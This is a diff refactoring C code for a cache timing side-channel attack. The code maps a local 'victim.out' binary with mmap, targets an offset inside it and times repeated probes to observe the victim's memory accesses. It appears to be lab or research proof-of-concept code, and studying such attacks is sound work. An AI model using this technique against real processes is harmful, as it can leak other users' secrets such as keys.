@@ -6,17 +6,15 @@
  ************************************************************************/
 
 #include <fcntl.h>
-#include <stdbool.h>
 #include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
 #include <sys/mman.h>
-#include <unistd.h>
 
-#define debug 1
-#define ITERATIONTIMES 1000
-#define PROBE_THRESHOLD 200ul
-#define MAPPED_FILE_SIZE 4194304
-
+const uint32_t DEBUG = 1;
+const uint32_t ITERATIONTIMES = 1000;
+const uint32_t PROBE_THRESHOLD = 200;
+const uint32_t MAPPED_FILE_SIZE = 4194304;
 
 uint32_t probe(char *adrs) {
     volatile uint32_t time;
@@ -71,7 +69,7 @@ static __inline__ void wait(uint32_t value)
 void attack(char *address, size_t num, uint32_t waitting_cycles,
     uint32_t *result, uint32_t bias) {
     size_t i;
-    for (size_t i = 0; i < num; i++) {
+    for (i = 0; i < num; i++) {
         result[i] = probe(address) - bias;
         wait(waitting_cycles);
     }
@@ -85,7 +83,7 @@ int main(void)
     uint32_t waitting_cycles = 17000;
     uint32_t bias;
     uint32_t result[256];
-    char *target = (char *)0x808FFC; //the address to evict
+    unsigned long offest = 0x808FFC; //the address to evict
 
     /* map the executable file of victim to the virtual address space of attack process*/
     int victim_fd = open("./victim.out",O_RDONLY);
@@ -94,17 +92,17 @@ int main(void)
         exit(1);
     }
     map_len = MAPPED_FILE_SIZE;
-    void *base_address = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED,
+    char *target = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED,
             victim_fd, 0);
-    if (base_address == MAP_FAILED) {
+    if (target == MAP_FAILED) {
         perror("mmap");
         return 1;
     }
-    if(debug)
+    if(DEBUG)
     {
-        printf("The victim is mapped at: %p\n", base_address);
+        printf("The victim is mapped at: %p\n", target);
     }
-    target += base_address;
+    target += offest;
 
     printf("Started attacking...\n");
     bias = get_bias();
